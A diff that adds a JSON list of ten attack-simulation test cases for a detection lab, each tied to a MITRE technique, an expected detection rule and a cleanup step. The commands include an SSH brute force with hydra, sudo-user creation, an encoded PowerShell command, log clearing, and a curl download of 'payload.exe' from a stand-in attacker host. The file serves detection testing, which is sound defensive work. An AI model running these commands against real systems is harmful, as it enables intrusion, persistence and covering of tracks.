@@ -1,0 +1,116 @@
+[
+  {
+    "code": "T001",
+    "name": "SSH Brute-Force Simulation",
+    "targetHost": "LAB-LNX-01",
+    "os": "Linux",
+    "mitreTechnique": "T1110.001",
+    "expectedRule": "D001",
+    "telemetrySource": "linux_auditd",
+    "command": "hydra -l root -P passwords.txt ssh://192.168.56.102 -t 4",
+    "benignBaseline": "5 single legitimate user logins over 8 hours",
+    "cleanup": "None required"
+  },
+  {
+    "code": "T002",
+    "name": "Successful SSH Login Following Failures",
+    "targetHost": "LAB-LNX-01",
+    "os": "Linux",
+    "mitreTechnique": "T1110",
+    "expectedRule": "D002",
+    "expectedCorrelation": "C001",
+    "telemetrySource": "linux_auditd",
+    "command": "python3 simulate_login_after_failures.py --host 192.168.56.102",
+    "cleanup": "None required"
+  },
+  {
+    "code": "T003",
+    "name": "Linux Privilege Escalation Activity",
+    "targetHost": "LAB-LNX-01",
+    "os": "Linux",
+    "mitreTechnique": "T1548.003",
+    "expectedRule": "D004",
+    "telemetrySource": "linux_auditd",
+    "command": "sudo -i bash -c 'id'",
+    "cleanup": "exit"
+  },
+  {
+    "code": "T004",
+    "name": "Linux User Creation",
+    "targetHost": "LAB-LNX-01",
+    "os": "Linux",
+    "mitreTechnique": "T1136.001",
+    "expectedRule": "D005",
+    "expectedCorrelation": "C004",
+    "telemetrySource": "linux_auditd",
+    "command": "sudo useradd -m -s /bin/bash test_adversary && sudo usermod -aG sudo test_adversary",
+    "cleanup": "sudo userdel -r test_adversary"
+  },
+  {
+    "code": "T005",
+    "name": "Windows Suspicious PowerShell Execution",
+    "targetHost": "LAB-WIN-01",
+    "os": "Windows",
+    "mitreTechnique": "T1059.001",
+    "expectedRule": "D008",
+    "telemetrySource": "windows_sysmon",
+    "command": "powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
+    "cleanup": "None required"
+  },
+  {
+    "code": "T006",
+    "name": "Suspicious Process Chain",
+    "targetHost": "LAB-WIN-01",
+    "os": "Windows",
+    "mitreTechnique": "T1059",
+    "expectedRule": "D009",
+    "expectedCorrelation": "C002",
+    "telemetrySource": "windows_sysmon",
+    "command": "powershell.exe -Command \"Start-Process winword.exe -ArgumentList '/c cmd.exe /c echo SuspiciousSpawning'\"",
+    "cleanup": "taskkill /f /im winword.exe"
+  },
+  {
+    "code": "T007",
+    "name": "Scheduled Task Creation",
+    "targetHost": "LAB-WIN-01",
+    "os": "Windows",
+    "mitreTechnique": "T1053.005",
+    "expectedRule": "D010",
+    "telemetrySource": "windows_sysmon",
+    "command": "schtasks.exe /create /tn \"BlueOpsLabUpdate\" /tr \"powershell.exe -c Get-Date\" /sc daily /st 00:00",
+    "cleanup": "schtasks.exe /delete /tn \"BlueOpsLabUpdate\" /f"
+  },
+  {
+    "code": "T008",
+    "name": "Security Log Clearing",
+    "targetHost": "LAB-WIN-01",
+    "os": "Windows",
+    "mitreTechnique": "T1070.001",
+    "expectedRule": "D013",
+    "telemetrySource": "windows_sysmon",
+    "command": "wevtutil.exe cl \"Application\"",
+    "cleanup": "None required"
+  },
+  {
+    "code": "T009",
+    "name": "Known Threat Intel IOC Communication",
+    "targetHost": "LAB-FW-01",
+    "os": "Network",
+    "mitreTechnique": "T1071",
+    "expectedRule": "D015",
+    "expectedCorrelation": "C003",
+    "telemetrySource": "suricata",
+    "command": "curl -s -m 2 http://evil-corp.blueops.lab/payload.exe",
+    "cleanup": "None required"
+  },
+  {
+    "code": "T010",
+    "name": "Controlled Response Simulation and Rollback",
+    "targetHost": "LAB-WIN-01",
+    "os": "Cross-Platform",
+    "mitreTechnique": "Response",
+    "expectedPlaybook": "P001",
+    "command": "POST /api/v1/response/actions (P001, target: 198.51.100.24)",
+    "cleanup": "POST /api/v1/response/actions/{id}/rollback"
+  }
+]
